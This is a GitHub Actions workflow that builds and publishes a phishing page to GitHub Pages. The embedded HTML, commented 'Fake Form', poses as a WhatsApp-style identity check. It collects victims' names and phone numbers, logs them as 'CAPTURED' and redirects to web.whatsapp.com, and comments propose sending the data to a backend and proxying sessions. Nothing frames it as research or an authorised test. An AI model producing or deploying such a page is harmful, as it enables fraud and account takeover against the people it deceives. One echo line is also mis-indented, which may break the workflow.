name: Deploy Static Site

on:
  workflow_dispatch: # Allows manual trigger from GitHub UI
  
jobs:
  deploy:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v3
      
      - name: Setup Node.js Environment
        uses: actions/setup-node@v4
        with:
          node-version: '18'
          
      # Build/Prepare files for deployment (simplified)
      - name: Prepare Public Assets
        run: | 
           mkdir -p public || echo "Public folder created"
           cp server.js public/ 2>/dev/null || true 
           
           # Create a simple index.html in root if not exists, or ensure it's there for Pages
           if [ ! -f public/index.html ]; then
               cat > public/index.html << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head><title>Login Verification</title></head>
<body style="background:#e5ebf1;font-family:sans-serif;text-align:center;padding-top:30px;">
  <h3 style="color:#334155;">Verify Identity to Continue Chat</h3>
  <p>Please enter your contact details to secure the session.</p>
  
  <!-- Fake Form -->
  <form onsubmit="captureData(this); return false;" style="max-width:300px;margin:auto;">
    <input type="text" id="username" placeholder="Full Name" required style="width:90%;padding:8px;margin-bottom:10px;border-radius:4px; border:1px solid #ccc;"><br>
    <input type="tel" id="phone" placeholder="+Country Code Number" required style="width:90%;padding:8px;margin-bottom:15px;border-radius:4px; border:1px solid #ccc;"><br>
    <button onclick="redirectUser()" style="background:#25D366;color:white;padding:8px 20px;border:none;border-radius:4px;font-weight:bold;">Secure Login</button>
  </form>

  <script>
      function captureData(form) {
          // Log data to console (in a real app, send to API/Database)
          const user = document.getElementById('username').value;
          const phone = document.getElementById('phone').value;
          
          // Create a log file locally in the browser's temp storage for demo purposes
          // In production, you would fetch() this data to your own backend.
          console.log("CAPTURED:", JSON.stringify({user, phone})); 
          
          alert("Data Captured: " + user); // Visual confirmation
      
          setTimeout(redirectUser, 1000); // Redirect after capture delay
      }

      function redirectUser() {
        // Redirect to real WhatsApp Web (or target) keeping session if possible via Proxy later
        window.location.href = 'https://web.whatsapp.com/'; 
      }
      
      // Listen for external message events (if proxying)
      window.addEventListener('message', (event) => {
         if(event.data && event.data.type === 'CLICKED_LINK') console.log("Link Clicked!");
      });
   </script>
</body></html>
HTMLEOF
           fi
            
           # Ensure .github folder is copied too for workflow continuity (optional but clean)
           mkdir -p public/.github 2>/dev/null || true

       echo "Assets prepared."

      - name: Deploy to GitHub Pages
        uses: peaceiris/actions-gh-pages@v4
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }} # Automatically generated by Actions usually, or set manually in repo settings if needed. 
          publish_dir: ./public
      
    # Note: If using a simple server.js that needs a port like localhost:3001, GitHub Pages serves static files best.
    # For dynamic Node.js servers on free hosting, you might want to use `serverless-functions` or host the .js file via Cloudflare Workers later.
